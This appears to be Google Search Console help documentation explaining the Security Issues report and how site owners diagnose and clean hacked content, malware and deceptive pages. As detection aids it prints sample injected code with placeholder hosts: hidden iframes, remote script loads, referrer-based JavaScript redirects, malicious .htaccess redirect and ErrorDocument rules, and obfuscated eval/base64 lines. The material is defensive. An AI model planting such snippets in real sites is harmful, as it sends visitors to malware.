@@ -1,0 +1,315 @@
+Security Issues reportIf a Google evaluation determines that your site was hacked, or that it exhibits behavior that could potentially harm a visitor or their computer, the Security Issues report will show Google's findings. Examples of harmful behavior include phishing attacks or installing malware or unwanted software on the user's computer.
+Pages or sites affected by a security issue can appear with a warning label in search results or an interstitial warning page in the browser when a user tries to visit them.
+Open the Security Issues report
+What are security issues?
+Security issues fall into the following categories:
+Hacked content: This is any content placed on your site without your permission because of security vulnerabilities in your site. In order to protect our users, Google tries its best to keep hacked content out of our search results. Learn more.
+Malware and unwanted software: This is software that is designed to harm a device or its users, that engages in deceptive or unexpected practices, or that negatively affects the user. Learn more.
+Social engineering: This is content that tricks visitors into doing something dangerous, such as revealing confidential information or downloading software. Learn more.
+Do I have security issues on my site?
+If you have security issues, you'll see a count of all security issues on your site at the top of the report.
+If your site has no security issues, you'll see a green check mark and an appropriate message.
+But I just bought this site!
+If you recently bought a site that had pre-existing security issues, fix the issues listed in the Security Issues report, then let us know in your reconsideration request that you recently acquired the site and that it now adheres to the Google Webmaster Guidelines.
+Which pages are affected?
+Expand an issue description to see a list of sample affected URLs. This list is not necessarily complete, but just a sample of pages on your site affected by the selected issue. Occasionally you might have a security issue with no example URLs; this does not mean that no pages are affected, only that we could not generate samples for some reason.
+The issue details show the date that the issue was first detected on your site, as well as a brief description and a link to learn more about the issue.
+Fix the problem
+To fix a security issue on your site:
+Expand the issue description on the Security Issues report.
+Read the description of the issue and follow its "Learn more" link for detailed information and steps to fix the issue. (The learn more links point to the descriptions below on this page.)
+Use the sample of affected pages provided in the details section to troubleshoot and fix your issue. This list is not necessarily complete, but just a sample of pages on your site affected by this issue. You might have a security issue with no example URLs; this does not mean that no pages are affected, only that we could not generate samples for some reason.
+Fix the issue throughout your site. Fixing the issue on just some pages will not earn you a partial return to search results.
+If the report lists multiple security issues affecting your site, fix all of them.
+Test your fixes.
+When all issues listed in the report are fixed in all pages, select Request Review in the Security Issues report. In your reconsideration request, describe your fixes. A good request does three things:
+Explains the exact quality issue on your site.
+Describes the steps you’ve taken to fix the issue.
+Documents the outcome of your efforts.
+Reconsideration reviews can take a week or two. You will be informed of progress by email. You will get a review confirmation message when you send your request, to inform you that the review is in progress; don't resubmit your request before you get a final decision on your outstanding request.
+How long will my reconsideration review take?
+Up to a week or two. You will be informed by email when we receive your request, so you'll know it is active. You will also receive an email when the review is complete.
+Please don't resubmit your request before you get a decision on any outstanding requests. Submitting a reconsideration request when the issue hasn't been fixed can cause longer turnaround time for the next request, or even get you marked as a repeat offender.
+List of security issues
+Here is a list of possible security issues, with information about how to fix each issue. Issues are classified as either errors  or warnings .
+Deceptive pages
+Your site includes content that tricks visitors into doing something dangerous, such as revealing confidential information or downloading software. Google Safe Browsing protects web users by warning them before they visit pages that consistently display deceptive content.
+Web pages are considered deceptive when they either:
+Pretend to act, or look and feel, like a trusted entity, like your own device or browser, or the website itself, or
+Try to trick you into doing something you’d only do for a trusted entity, like sharing a password,  or calling a tech support number, or downloading software.
+This type of deceptive content is called social engineering. Learn more about social engineering or see examples of deceptive pages.
+Fix the problem
+1. Confirm the issue
+Visit the example pages to look for the deceptive content. You can use the URL Inspection tool to view your site in both mobile and desktop views.
+2. Fix your pages
+Fix any pages that engage in social engineering. If you believe Safe Browsing has classified a web page in error, please report it here.
+3. Request a review
+When you confirm that the problem is fixed in your site, request a security review in the Security Issues report. A review can take from a few days to a few weeks to complete.
+Deceptive embedded resources
+Your site includes deceptive advertisements or embedded resources that trick visitors into doing something dangerous, such as revealing confidential information or downloading unwanted software. Deceptive content may be included via resources embedded in the page, such as images, other third-party components, or ads. Google Safe Browsing protects web users by warning them before they visit pages that consistently display deceptive content.
+Sometimes this content is visible to users on the host page; in other cases, the host site does not contain any visible ads, but leads users to bad pages via pop-ups, pop-unders, or other types of redirection. In all cases, this type of embedded content will result in a policy violation for the host page.
+This type of deceptive content is called social engineering. Learn more about social engineering or see examples of deceptive embedded resources.
+Fix the problem
+1. Confirm the issue
+Visit the example pages to look for the deceptive content. Verify that no ads, images, or other embedded third-party resources on your site's pages are deceptive. Note that ad networks may rotate the ads shown on your site's pages. You therefore might need to refresh a page a few times before you're able to see any social engineering ads appear. Some ads may appear differently on mobile devices and desktop computers. You can use the URL Inspection tool to view your site in both mobile and desktop views.
+2. Remove the deceptive ads or resources
+Check the third-party resources included in your site. Ensure that any ads, images, or other embedded third-party resources on your site's pages are not deceptive. Fix any pages that engage in social engineering.
+3. Request a review
+When you confirm that the problem is fixed in your site, request a security review in the Security Issues report. A review can take from a few days to a few weeks to complete.
+Malware
+Your site has been infected by, or is hosting, malware from a malicious hacker. Malware is any software or mobile application specifically designed to harm a computer, a mobile device, the software it runs, or its users.
+1. Decide if this is something you can fix
+Fixing a malware issue on your site requires the ability to read and understand code, and possibly web server configurations for your site. If you think this is beyond your comfort zone, read Build a support team to learn about finding help.
+2. Diagnose and fix your malware issue
+There are many types of malware. Read the following sections to try to diagnose and fix your specific malware type. Note that your site might be infected more than one type of malware; be thorough in your diagnosis and site cleaning.
+Malware type: Server configuration
+Description
+A hacker has compromised your site and is redirecting visitors from your good site to their malware attack site, likely by modifying your server’s configuration file(s). Server configuration files commonly allow the site administrator to specify URL redirects for specific pages or directories on a website. For example, on Apache servers, this is the .htaccess file as well as httpd.conf.
+Fix the issue
+1. Confirm the issue
+Visit some of the example URLs shown in the Security Issues report.
+Avoid using a browser to directly view infected pages on your site.
+Because malware often spreads by exploiting browser vulnerabilities, opening an infected malware page in a browser may damage your computer. Additionally, hackers might hide the spammy content using cloaking techniques to avoid detection by site owners.
+Here are two alternate methods for viewing content more safely on your computer:
+Use the URL Inspection tool to view your page as Google sees it. This is useful since many hackers make changes that are visible only to Google machines. For example, they might add links from your site to theirs that are only rendered when the referrer is Google.
+Use cURL or Wget to perform HTTP requests (such as fetching a page) from the command-line. These freely available tools are helpful in diagnosing redirects and have the ability to specify referrer or user-agent information. Hackers often attack only specific user-agents or referrers to avoid detection and select better targets; using these tools enable you to mimic a target. Try using different referrer addresses (such as links from large websites, or different search engines) if your request doesn't elicit the spammy behavior. For example, to mimic a user following a link from Google Search results to www.example.com/page.html on a Windows machine, you would use cURL like this:
+$curl -v --referer "https://www.google.com" --user-agent "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)" http://www.example.com/page.html
+A response from a page infected with the "server configuration" infection might include the following headers:
+...
+< HTTP/1.1 301 Moved Permanently
+< Date: Sun, 24 Feb 2013 21:06:45 GMT
+< Server: Apache
+< Location: http://<malware-attack-site>/index.html
+< Content-Length: 253
+...
+2. Clean your site of the "server configuration" malware
+Log in to your server through shell/terminal access (the site may be offline if you wish) and review relevant server configuration files. There may be more than one hacked server configuration file on your site. Check these files for unwanted directives, such as redirects, where the hacker can configure your site to redirect to unknown malware attack sites. For example, in the .htaccess file, you might see a redirect such as this:
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} .*google.*
+RewriteRule ^third-page.html($|/) http://<malware-site>/index.html [R=301]
+Additionally:
+Be sure to check the entire file in case the hacker added their code at the end of the file where it could more easily be missed.
+Investigate potential cron jobs created by the hacker that are designed to continually update the .htaccess file. Cron jobs can be listed in several locations including /etc/crontab (also numerous /etc/cron* directories) and /var/spool/cron.
+Read the Hacked guide for a complete fix flow for your site, including cleanup steps and tips for preventing your site from being hacked again.
+Malware type: SQL injection
+Description
+A hacker has probably compromised your site’s database. For example, the hacker may have programmatically inserted malicious code into every record of a database table, so that when the server loads a page that requires information from the database, the malicious code is now embedded in the page’s content and can potentially harm site visitors.
+Fix the issue
+1. Confirm the issue
+Run some queries on the affected URLs in the command-line, and examine the response for SQL attack words like "iframe" or "eval".
+Avoid using a browser to directly view infected pages on your site.
+Because malware often spreads by exploiting browser vulnerabilities, opening an infected malware page in a browser may damage your computer. Additionally, hackers might hide the spammy content using cloaking techniques to avoid detection by site owners.
+Here are two alternate methods for viewing content more safely on your computer:
+Use the URL Inspection tool to view your page as Google sees it. This is useful since many hackers make changes that are visible only to Google machines. For example, they might add links from your site to theirs that are only rendered when the referrer is Google.
+Use cURL or Wget to perform HTTP requests (such as fetching a page) from the command-line. These freely available tools are helpful in diagnosing redirects and have the ability to specify referrer or user-agent information. Hackers often attack only specific user-agents or referrers to avoid detection and select better targets; using these tools enable you to mimic a target. Try using different referrer addresses (such as links from large websites, or different search engines) if your request doesn't elicit the spammy behavior. For example, to mimic a user following a link from Google Search results to www.example.com/page.html on a Windows machine, you would use cURL like this:
+$curl -v --referer "https://www.google.com" --user-agent "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)" http://www.example.com/page.html
+Next, log in to your database server or view your database through a tool like phpMyAdmin. If you used Wget or cURL, try to correlate the damage found in the page's source code through Wget or cURL with the actual database entries. For example, if you noticed your pages included a dangerous iframe, you could perform a SQL query searching for iframe code. For example:
+SELECT * FROM blog_posts WHERE post_text LIKE '%>iframe%';
+You may also want to check database log and error files on your server for unusual activity, such as unexpected SQL commands that seem abnormal for regular users or errors.
+2. Clean your site
+When ready to clean your site , you can either update each infected database record or you can restore your last known database backup.
+Additionally:
+Read the Hacked guide for a complete fix flow for your site, including cleanup steps and tips for preventing your site from being hacked again.
+Malware type: Code injection
+Description
+Pages on your site were modified to include malicious code, such as an iframe to a malware attack site.
+Fix the issue
+1. Confirm the issue
+Visit URLs listed as infected in the Security Issues report. Examine the HTML of the responses for malicious code.
+Avoid using a browser to directly view infected pages on your site.
+Because malware often spreads by exploiting browser vulnerabilities, opening an infected malware page in a browser may damage your computer. Additionally, hackers might hide the spammy content using cloaking techniques to avoid detection by site owners.
+Here are two alternate methods for viewing content more safely on your computer:
+Use the URL Inspection tool to view your page as Google sees it. This is useful since many hackers make changes that are visible only to Google machines. For example, they might add links from your site to theirs that are only rendered when the referrer is Google.
+Use cURL or Wget to perform HTTP requests (such as fetching a page) from the command-line. These freely available tools are helpful in diagnosing redirects and have the ability to specify referrer or user-agent information. Hackers often attack only specific user-agents or referrers to avoid detection and select better targets; using these tools enable you to mimic a target. Try using different referrer addresses (such as links from large websites, or different search engines) if your request doesn't elicit the spammy behavior. For example, to mimic a user following a link from Google Search results to www.example.com/page.html on a Windows machine, you would use cURL like this:
+$curl -v --referer "https://www.google.com" --user-agent "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)" http://www.example.com/page.html
+Here are some examples of malicious code:
+iframe that loads a malicious site:
+<iframe frameborder="0" height="0" src="http://<malware-site>/path/file"
+style="display:none" width="0"></iframe>
+JavaScript or another scripting language that calls and runs scripts from an attack site:
+<script type='text/javascript' src='http://<malware-site>/js/x55.js'></script>
+Scripting that redirects the browser to an attack site:
+<script>
+if (document.referrer.match(/google\.com/)) {
+window.location("http://<malware-site>/");
+}
+</script>
+Malicious code that’s obfuscated to avoid detection:
+eval(base64_decode("aWYoZnVuaauUl+hasdqetiDi2iOwlOHTgs+slgsfUNlsgasdf"));
+Shared object files designed to randomly write harmful code to otherwise benign scripts:
+#httpd.conf modified by the hacker
+LoadModule harmful_module modules/mod_harmful.so
+AddModule mod_harmful.c
+Investigate all possible harmful code present on the site. It may be helpful to search for words like "iframe" to find iframe code. Other helpful keywords are "script", "eval", and "unescape." For example, to search all files for "iframe" on Unix-based systems:
+$grep -irn "iframe" ./ | less
+2. Clean your site
+When ready to clean your site , you can either replace affected files with the last good backup or you can remove the code injection from each page and all related scripting functions or files. If you modified server configuration files, you may need to restart your webserver for the changes to become effective.
+Additionally:
+Read the hacked guide for a complete fix flow for your site, including cleanup steps and tips for preventing your site from being hacked again.
+Malware type: error template
+Description
+The template used for error messages, such as 404 File not Found, is configured to distribute malware. In this way, attackers can launch attacks on URLs that do not even exist on your site.
+Fix the issue
+1. Confirm the issue
+Request a page on your site that doesn't exist, or that throws another type of error, and examine the response to see if it comes from another site or otherwise contains malware.
+Avoid using a browser to directly view infected pages on your site.
+Because malware often spreads by exploiting browser vulnerabilities, opening an infected malware page in a browser may damage your computer. Additionally, hackers might hide the spammy content using cloaking techniques to avoid detection by site owners.
+Here are two alternate methods for viewing content more safely on your computer:
+Use the URL Inspection tool to view your page as Google sees it. This is useful since many hackers make changes that are visible only to Google machines. For example, they might add links from your site to theirs that are only rendered when the referrer is Google.
+Use cURL or Wget to perform HTTP requests (such as fetching a page) from the command-line. These freely available tools are helpful in diagnosing redirects and have the ability to specify referrer or user-agent information. Hackers often attack only specific user-agents or referrers to avoid detection and select better targets; using these tools enable you to mimic a target. Try using different referrer addresses (such as links from large websites, or different search engines) if your request doesn't elicit the spammy behavior. For example, to mimic a user following a link from Google Search results to www.example.com/page.html on a Windows machine, you would use cURL like this:
+$curl -v --referer "https://www.google.com" --user-agent "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)" http://www.example.com/page.html
+2. Clean your site
+Log in to your webserver and search your server configuration files for error page directives. For example, the error template for Apache webservers can be declared in the .htaccess file. Here is an example .htaccess file entry that retrieves 404 error pages from a malicious site:
+ErrorDocument 404 http://<malware-site>/index.html
+When ready to clean your site , you can either replace the .htaccess files(s) with a known good backup, or you can delete the unwanted ErrorDocument directives on the existing .htaccess file(s). Be sure to also clean the actual error files if they exist on your site. Last, restart your webserver to make sure all changes take effect.
+Additionally:
+Read the hacked guide for a complete fix flow for your site, including cleanup steps and tips for preventing your site from being hacked again.
+Malware type: Cross-site malware
+Description
+The site is loading content from a website that is known to contain malicious content. In Chrome, this is denoted by a browser interstitial with the following graphic:
+Fix the issue​
+Confirm the issue by browsing to a few of the sample URLs listed in the Security Issues report. You should see the graphic above if this is a cross-site malware issue.
+The browser warning will tell you the domain of the questionable content. Remove all references to the flagged site listed in the browser warning.
+If you discover that a page on your site has been including content from a flagged site without your knowledge, the problem is more serious and your site has most likely been compromised. In either case, Google recommends the Help for Hacked Sites recovery protocol to quarantine your site, assess the damage and clean up your site.
+After you remove all social engineering content from your site, request a security review in the Security Issues report. A review can take from a few days to a few weeks to complete.
+If you intentionally included content from a legitimate site that became flagged and you wish to re-include the content after the flagged site becomes cleaned up, you can monitor the status of the flagged site using the Google Safe Browsing diagnostics page for that site (http://www.google.com/safebrowsing/diagnostic?site=www.example.com). Legitimate sites are often cleaned up quickly by their owners.
+Other types of malware
+There are many other types of malware that can affect your site. See the Web Fundamentals site for more tips on diagnosing and fixing other hacking types. After fixing your site, be sure to request a review.
+3. Request a review
+When you confirm that the problem is fixed in your site, request a security review in the Security Issues report. A review can take from a few days to a few weeks to complete.
+Hacked type: Code injection
+A hacker has compromised your site and is injecting malicious code in your pages. Examples include redirects to a malicious site or running cryptocurrency mining software on your browser while the page is open.
+1. Decide if this is something you can fix
+See Build a support team to get an idea of what it might take to fix this yourself, or how to find help you think this is beyond your skill set.
+2. Confirm the issue
+Avoid using a browser to directly view infected pages on your site.
+Because malware often spreads by exploiting browser vulnerabilities, opening an infected malware page in a browser may damage your computer. Additionally, hackers might hide the spammy content using cloaking techniques to avoid detection by site owners.
+Here are two alternate methods for viewing content more safely on your computer:
+Use the URL Inspection tool to view your page as Google sees it. This is useful since many hackers make changes that are visible only to Google machines. For example, they might add links from your site to theirs that are only rendered when the referrer is Google.
+Use cURL or Wget to perform HTTP requests (such as fetching a page) from the command-line. These freely available tools are helpful in diagnosing redirects and have the ability to specify referrer or user-agent information. Hackers often attack only specific user-agents or referrers to avoid detection and select better targets; using these tools enable you to mimic a target. Try using different referrer addresses (such as links from large websites, or different search engines) if your request doesn't elicit the spammy behavior. For example, to mimic a user following a link from Google Search results to www.example.com/page.html on a Windows machine, you would use cURL like this:
+$curl -v --referer "https://www.google.com" --user-agent "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)" http://www.example.com/page.html
+The hacker may have injected the malicious code directly into your site's HTML files (for example, adding a JavaScript redirect) or into files that generate your site's content (for example, PHP files).
+Fetch a compromised page listed in the report, and examine the reply. Hackers can use several different techniques to redirect visitors from your site to theirs; here are a few:
+Redirection:​
+Header redirects: Hackers can redirect visitors by modifying your server's configuration file(s). Server configuration files commonly allow the site administrator to specify URL redirects for specific pages or directories on a website. For example, on Apache servers, this is the .htaccess file as well as httpd.conf.
+...
+< HTTP/1.1 301 Moved Permanently
+< Date: Sun, 24 Feb 2013 21:06:45 GMT
+< Server: Apache
+< Location: http://<malware-site>/index.html
+< Content-Length: 253
+JavaScript redirects:
+<script>
+if (document.referrer.match(/google\.com/)) {
+window.location("http://<malware-site>/");}
+<script>
+Malicious JavaScript loaded from another site:
+<script type='text/javascript' src='http://<malware-site>/js/x55.js'></script>
+Malicious code that is obfuscated to avoid detection:
+eval(base64_decode("d2luZG93LmxvY2F0aW9uPScvL2dvb2dsZS5jb20nOw=="));
+Search for suspicious code in your responses and on your site. Useful search terms include "search", "eval", "base64_decode", and "unescape".
+3. Clean your site
+When ready to clean your site , you can either replace affected files with the last good backup or you can remove the spammy content yourself.
+Additionally:
+Read the hacked guide for a complete fix flow for your site, including cleanup steps and tips for preventing your site from being hacked again.
+4. Request a review
+When you confirm that the problem is fixed in your site, request a security review in the Security Issues report. A review can take from a few days to a few weeks to complete.
+Hacked type: Content injection
+A hacker has added spammy links or text to your site’s pages. The injected content may contain pharmaceutical terms or other spam unrelated to the site’s content.
+Typically, hackers modify your site in one of these ways:
+By gaining access to an insecure directory on your server. For example, you may have inadvertently left a directory with open permissions.
+By exploiting a vulnerability in software running on your site, such as a content management system. For example, you might be running an older, insecure version of Drupal, Joomla! or WordPress.
+By hacking third-party plugins that you use on your site, such as visitor counters.
+1. Decide if this is something you can fix
+See Build a support team to get an idea of what it might take to fix this yourself, or how to find help you think this is beyond your skill set.
+2. Confirm the issue
+Avoid using a browser to directly view infected pages on your site.
+Because malware often spreads by exploiting browser vulnerabilities, opening an infected malware page in a browser may damage your computer. Additionally, hackers might hide the spammy content using cloaking techniques to avoid detection by site owners.
+Here are two alternate methods for viewing content more safely on your computer:
+Use the URL Inspection tool to view your page as Google sees it. This is useful since many hackers make changes that are visible only to Google machines. For example, they might add links from your site to theirs that are only rendered when the referrer is Google.
+Use cURL or Wget to perform HTTP requests (such as fetching a page) from the command-line. These freely available tools are helpful in diagnosing redirects and have the ability to specify referrer or user-agent information. Hackers often attack only specific user-agents or referrers to avoid detection and select better targets; using these tools enable you to mimic a target. Try using different referrer addresses (such as links from large websites, or different search engines) if your request doesn't elicit the spammy behavior. For example, to mimic a user following a link from Google Search results to www.example.com/page.html on a Windows machine, you would use cURL like this:
+$curl -v --referer "https://www.google.com" --user-agent "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)" http://www.example.com/page.html
+Fetch some pages in your site and search the responses for suspicious content or links that you did not add. For example, search for pharmaceuticals or spammy terms such as "viagra" or "earn money".
+3. Clean your site
+When ready to clean your site , you can either replace affected files with the last good backup, or you can remove the spammy content and links from each page. Make sure to fix all the hacking examples shown on the Security Issues report. In addition, search for other pages on your site that may have been hacked by using “site:” search on Google and searching the source files on your website.
+Additionally:
+Read the hacked guide for a complete fix flow for your site, including cleanup steps and tips for preventing your site from being hacked again.
+4. Request a review
+When you confirm that the problem is fixed in your site, request a security review in the Security Issues report. A review can take from a few days to a few weeks to complete.
+Hacked type: URL injection
+A hacker has created new pages on your site, often containing spammy words or links. Sometimes these new pages contain code that does things you didn’t intend, such as redirecting your users to other sites or making your webserver participate in a denial-of-service attack against other sites.
+1. Decide if this is something you can fix
+See Build a support team to get an idea of what it might take to fix this yourself, or how to find help you think this is beyond your skill set.
+2. Confirm the issue
+Avoid using a browser to directly view infected pages on your site.
+Because malware often spreads by exploiting browser vulnerabilities, opening an infected malware page in a browser may damage your computer. Additionally, hackers might hide the spammy content using cloaking techniques to avoid detection by site owners.
+Here are two alternate methods for viewing content more safely on your computer:
+Use the URL Inspection tool to view your page as Google sees it. This is useful since many hackers make changes that are visible only to Google machines. For example, they might add links from your site to theirs that are only rendered when the referrer is Google.
+Use cURL or Wget to perform HTTP requests (such as fetching a page) from the command-line. These freely available tools are helpful in diagnosing redirects and have the ability to specify referrer or user-agent information. Hackers often attack only specific user-agents or referrers to avoid detection and select better targets; using these tools enable you to mimic a target. Try using different referrer addresses (such as links from large websites, or different search engines) if your request doesn't elicit the spammy behavior. For example, to mimic a user following a link from Google Search results to www.example.com/page.html on a Windows machine, you would use cURL like this:
+$curl -v --referer "https://www.google.com" --user-agent "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)" http://www.example.com/page.html
+Query the example URLs listed in the report to see if they are active. You probably haven't created these pages yourself, so you will need to remove the pages on your site, or eliminate the code that auto-generates the pages. Read how to find and clean these pages from your site.
+You can also do a “site:” search to find pages that you have not created.
+On a small site, you can search [site:example.com] in Google Search to see a list of pages that we have indexed, to see if any pages exist that you haven't created.
+For larger sites, you can use a more specific query, for example:
+[site:example.com pharmacy] - List all pages containing the word "pharmacy" on example.com. Substitute other common spammy terms.
+[site:example.com/wp-admin/] - List all pages in the site administrator section of your WordPress site.
+3. Clean your site
+When ready to clean your site , you can either replace affected directories with the last good backup or you can remove the unwanted pages and any files or functions the hacker used to create them.
+Additionally:
+Read the hacked guide for a complete fix flow for your site, including cleanup steps and tips for preventing your site from being hacked again.
+4. Request a review
+When you confirm that the problem is fixed in your site, request a security review in the Security Issues report. A review can take from a few days to a few weeks to complete.
+Harmful downloads
+Your site is offering users a download that Google Safe Browsing thinks is either malware or unwanted software. The Chrome browser may show a warning when a user visits your site. You must remove these downloads from your site to remove the warning.
+1. Assess the problem
+If these downloads are intentional, remove them from your site and skip to Request a review.
+If you are unaware of any downloads on your site, you may have been hacked. You should fix your hacked site, then find and remove the downloads.
+2. Decide if this is something you can fix
+See Build a support team to get an idea of what it might take to fix this yourself, or how to find help you think this is beyond your skill set.
+3. Confirm the issue
+View some of the example pages on your site to confirm the presence of these downloads.
+4. Clean your site
+Read the hacked guide for a complete fix flow for your site, including cleanup steps and tips for preventing your site from being hacked again. When ready to clean your site , you can either replace affected files with the last good backup or you can remove the spammy content yourself. Use antivirus software to scan the binaries and other content hosted on your site. Antivirus software finds many types of malware and unwanted software but, unfortunately, not all types. Submitting your software to an anti-virus program (or an anti-virus consolidation service, such as VirusTotal) will give you an indicator of potential issues with your software. Google Safe Browsing applies its own criteria to determine whether a program or binary is unwanted software or malware.
+5. Confirm your fixes
+Ensure that your site conforms to the Unwanted Software Policy.
+6. Request a review
+When you confirm that the problem is fixed in your site, request a security review in the Security Issues report. A review can take from a few days to a few weeks to complete.
+Links to harmful downloads
+Your site is linking to sites that offer downloads that are either malware or unwanted software, according to Google Safe Browsing. The Chrome browser may show a warning when a user visits your site. You must remove links to the harmful sites to remove the warning.
+1. Assess the problem
+If these links are intentional, remove them from your site and skip to Request a review.
+If you are unaware of these links, you may have been hacked.
+2. Decide if this is something you can fix
+If you have been hacked, see Build a support team to get an idea of what it might take to fix this yourself, or how to find help if you think this is beyond your skill set.
+3. Confirm the issue
+View some of the example pages on your site to confirm the presence of these downloads. In some cases, hackers can hide these links if they think you are the site owner, so try visiting the sample URLs with the URL Inspection tool, or logged in with a different account or on another computer.
+4. Clean your site
+Read the hacked guide for a complete fix flow for your site, including cleanup steps and tips for preventing your site from being hacked again. When ready to clean your site , you can either replace affected files with the last good backup or you can remove the spammy content yourself.
+5. Confirm your fixes
+Ensure that your site conforms to the Unwanted Software Policy.
+6. Request a review
+When you confirm that the problem is fixed in your site, request a security review in the Security Issues report. A review can take from a few days to a few weeks to complete.
+Unclear mobile billing
+Google has detected that your site is not sufficiently informing users about mobile charges, Chrome may display a warning before the user loads a page that incurs charges.
+1. Confirm the issue
+Visit the example URLs listed in the report to see which pages have unclear mobile billing behavior. Review the mobile billing guidelines here.
+2. Fix the problem
+Fix your pages so they conform to the mobile billing best practices.
+3. Request a review
+When you confirm that the problem is fixed in your site, request a security review in the Security Issues report. A review can take from a few days to a few weeks to complete.
+Uncommon downloads
+Your site is offering a download that Google Safe Browsing hasn't seen before. The Chrome browser may warn that the file is uncommonly downloaded and could be dangerous. These warnings are lifted automatically if Google Safe Browsing verifies that the files are safe. Note that example URLs are not always given for this issue.
+This issue will not prevent your page or site from appearing in Google Search results, but it will show a warning in the Chrome browser when a user initially requests to download unknown files.
+1. Fix the problem
+Find and confirm whether your downloads conform to the download guidelines.
+If any downloads on your site, violate these guidelines, remove them.
+If a download does not violate these guidelines, you do not need to remove it.
+2. Request a review
+When you're finished removing files (or verifying that your downloads conform to the download guidelines), request a security review in the Security Issues report. A review can take from a few days to a few weeks to complete. Even without a review request, Google will eventually evaluate most downloads and classify them as either acceptable or harmful. However, submitting a review request can help speed the evaluation process.
+What's the difference between the Manual Actions report and the Security Issues report?
+The Manual Actions report lists issues with a page or site that are mostly attempts to manipulate our search index, but are not necessarily dangerous for users. Most issues reported here will result in pages or site being ranked lower or omitted from search results without any visual indication to the user.
+The Security Issues report lists indications that your site was hacked, or behavior on your site that could potentially harm a visitor or their computer: for example, phishing attacks or installing malware or unwanted software on the user's computer. These pages can appear with a warning label in search results, or a browser can display an interstitial warning page when a user tries to visit them.
+Was this helpful?How can we improve it?YesNoSubmit
+true
+Security, malware, and manual actionsWhat is hacking or hacked content?Malware and unwanted softwarePreventing malware infectionSecurity Issues reportSocial Engineering (Phishing and Deceptive Sites)Manual Actions reportGoogle Safe Browsing Repeat Offenders PolicyVerifying Googlebot
+New to Search Console? Never used Search Console before? Start here, whether you're a complete beginner, an SEO expert, or a website developer.
